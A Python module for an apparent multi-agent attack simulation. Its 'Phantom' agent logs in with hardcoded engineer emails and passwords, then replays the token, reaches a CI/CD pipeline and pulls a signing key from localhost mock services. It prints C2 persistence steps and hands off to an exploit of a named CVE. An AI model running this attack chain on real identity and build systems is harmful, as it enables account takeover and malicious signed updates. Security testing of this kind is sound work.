"""
fleet/phantom.py

PHANTOM — Identity and Credential Specialist

Simulates credential theft against Haven-1
ground segment identity infrastructure.
Reports all findings to the General.
"""

import json
import time
import urllib.request
from datetime import datetime
from dataclasses import dataclass, field
from typing import Optional
from fleet.general import AgentID


@dataclass
class Credential:
    credential_type: str
    target_system:   str
    value:           str
    clearance_level: str
    expires_in:      int
    mfa_required:    bool
    timestamp:       str = field(
        default_factory=lambda: datetime.now().isoformat()
    )

    def to_dict(self) -> dict:
        return {
            "type":         self.credential_type,
            "target":       self.target_system,
            "value":        self.value[:20] + "...",
            "clearance":    self.clearance_level,
            "expires_in":   self.expires_in,
            "mfa_required": self.mfa_required,
            "timestamp":    self.timestamp,
        }


class Phantom:
    TARGET_ENGINEERS = [
        {
            "email":    "m.torres@vastspace.com",
            "password": "Haven1!",
            "clearance":"cicd_admin",
            "priority": "HIGH"
        },
        {
            "email":    "j.chen@vastspace.com",
            "password": "Falcon9!",
            "clearance":"cicd_write",
            "priority": "MEDIUM"
        },
        {
            "email":    "a.kim@vastspace.com",
            "password": "Dragon!",
            "clearance":"ground_ops",
            "priority": "LOW"
        },
    ]

    def __init__(self, general=None, verbose=True):
        self.general = general
        self.verbose = verbose
        self.captured_credentials = []
        self.session_tokens = {}
        self.access_map = {}
        self.signing_key = None
        if self.verbose:
            print("[PHANTOM] Identity specialist initialized")
            print("[PHANTOM] Mode: CREDENTIAL THEFT simulation")

    def run_credential_theft(self, surface_map: dict = None) -> dict:
        if self.verbose:
            print("\n[PHANTOM] Beginning credential theft operation...")
            print()

        token = self._spearphish()
        if not token:
            return {"status": "failed", "reason": "no credentials captured"}

        self._analyze_session(token)
        self._expand_access(token)
        self._extract_signing_key(token)
        self._establish_persistence(token)

        results = self._compile_results()

        if self.general:
            self.general.receive_report(
                sender=AgentID.PHANTOM,
                payload=results,
                reasoning=(
                    "Credential theft complete. cicd_admin token captured. "
                    "Signing key extracted. MFA gap confirmed. "
                    "Breacher can now sign malicious artifacts."
                ),
                confidence=0.97
            )
        return results

    def _spearphish(self) -> Optional[str]:
        if self.verbose:
            print("[PHANTOM] Phase 1: Spearphishing simulation")

        for eng in self.TARGET_ENGINEERS:
            if self.verbose:
                print(f"  [->] Targeting: {eng['email']} [{eng['priority']}]")
            time.sleep(0.4)

            try:
                data = json.dumps({
                    "email":    eng["email"],
                    "password": eng["password"]
                }).encode()
                req = urllib.request.Request(
                    "http://localhost:8080/auth/login",
                    data=data,
                    headers={"Content-Type": "application/json"},
                    method="POST"
                )
                with urllib.request.urlopen(req, timeout=5) as resp:
                    result = json.loads(resp.read())
                    if "token" in result:
                        token = result["token"]
                        mfa = result.get("mfa_required", True)
                        if self.verbose:
                            print(f"  [!] MFA: {'REQUIRED' if mfa else 'NOT REQUIRED — gap confirmed'}")
                            print(f"  [+] Token: {token[:20]}...")
                            print(f"  [+] Clearance: {eng['clearance']}")
                            print()

                        cred = Credential(
                            credential_type="okta_session_token",
                            target_system="ground-identity",
                            value=token,
                            clearance_level=eng["clearance"],
                            expires_in=result.get("expires_in", 86400),
                            mfa_required=mfa
                        )
                        self.captured_credentials.append(cred)
                        self.session_tokens[eng["email"]] = token

                        if eng["clearance"] == "cicd_admin":
                            return token
            except Exception as e:
                if self.verbose:
                    print(f"  [-] Failed: {e}")

        if self.session_tokens:
            return list(self.session_tokens.values())[0]
        return None

    def _analyze_session(self, token: str):
        if self.verbose:
            print("[PHANTOM] Phase 2: Session analysis")
        try:
            data = json.dumps({"token": token}).encode()
            req = urllib.request.Request(
                "http://localhost:8080/auth/validate",
                data=data,
                headers={"Content-Type": "application/json"},
                method="POST"
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read())
                if result.get("valid"):
                    payload = result.get("payload", {})
                    if self.verbose:
                        print(f"  [+] Token valid from any IP — no device binding")
                        print(f"  [+] Role: {payload.get('role')}")
                        print(f"  [+] Clearance: {payload.get('clearance')}")
                        print(f"  [!] 24-hour window — replay attack viable")
                        print()
                    self.access_map["session"] = {
                        "valid":           True,
                        "device_binding":  False,
                        "geo_check":       False,
                        "replay_possible": True,
                        "clearance":       payload.get("clearance")
                    }
        except Exception as e:
            if self.verbose:
                print(f"  [-] Session analysis: {e}")

    def _expand_access(self, token: str):
        if self.verbose:
            print("[PHANTOM] Phase 3: CI/CD access expansion")
        try:
            req = urllib.request.Request(
                "http://localhost:8081/pipeline/builds",
                headers={"Authorization": f"Bearer {token}"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read())
                if self.verbose:
                    print(f"  [+] CI/CD pipeline: ACCESS GRANTED")
                    builds = result.get("builds", [])
                    print(f"  [+] {len(builds)} builds in history")
                    print()
                self.access_map["cicd"] = {
                    "status":    "granted",
                    "builds":    len(result.get("builds", [])),
                    "can_inject": True
                }
        except Exception as e:
            if self.verbose:
                print(f"  [-] CI/CD access: {e}")

    def _extract_signing_key(self, token: str):
        if self.verbose:
            print("[PHANTOM] Phase 4: Signing key extraction")
        try:
            req = urllib.request.Request(
                "http://localhost:8081/pipeline/signing-key",
                headers={"Authorization": f"Bearer {token}"}
            )
            with urllib.request.urlopen(req, timeout=5) as resp:
                result = json.loads(resp.read())
                if "signing_key" in result:
                    self.signing_key = result["signing_key"]
                    if self.verbose:
                        print(f"  [!!!] SIGNING KEY EXTRACTED")
                        print(f"  [!!!] {self.signing_key[:20]}...")
                        print(f"  [!!!] Any artifact signed with this key")
                        print(f"        will be trusted by Haven-1 OBC")
                        print()
                    self.access_map["signing_key"] = {
                        "extracted":  True,
                        "preview":    self.signing_key[:16],
                        "impact":     "Full OBC update signing capability",
                        "path":       "IA-0009.02 -> EX-0009"
                    }
        except Exception as e:
            if self.verbose:
                print(f"  [-] Signing key: {e}")

    def _establish_persistence(self, token: str):
        if self.verbose:
            print("[PHANTOM] Phase 5: Credential persistence mechanisms")
            mechanisms = [
                ("Okta refresh token storage at C2",    "Survives password reset"),
                ("24-hour token replay from any IP",    "Foreign access succeeds"),
                ("Signing key stored at C2",             "Persistent artifact signing"),
            ]
            for mech, impact in mechanisms:
                print(f"  [+] {mech}")
                print(f"      {impact}")
            print()
        self.access_map["persistence"] = [
            "refresh_token_harvested",
            "session_replay_viable",
            "signing_key_persisted"
        ]

    def _compile_results(self) -> dict:
        return {
            "operation":            "credential_theft",
            "timestamp":            datetime.now().isoformat(),
            "credentials_captured": len(self.captured_credentials),
            "highest_clearance":    "cicd_admin",
            "signing_key_obtained": self.signing_key is not None,
            "signing_key_preview":  self.signing_key[:16] + "..." if self.signing_key else None,
            "session_tokens":       {k: v[:20] + "..." for k, v in self.session_tokens.items()},
            "access_map":           self.access_map,
            "gaps_confirmed": [
                "MFA not enforced — phishing gives full access",
                "Tokens not device-bound — replay from any IP",
                "Signing key in CI/CD environment — extractable",
                "Debug endpoints expose sensitive data",
            ],
            "recommended_next": {
                "agent":  "BREACHER",
                "task":   "Exploit CVE-2025-29912 using extracted signing key",
                "reason": "Signing key enables trusted artifact injection",
                "path":   "EX-0009"
            }
        }

    def get_signing_key(self) -> Optional[str]:
        return self.signing_key

    def get_best_token(self) -> Optional[str]:
        for eng in self.TARGET_ENGINEERS:
            if eng["email"] in self.session_tokens:
                return self.session_tokens[eng["email"]]
        return None
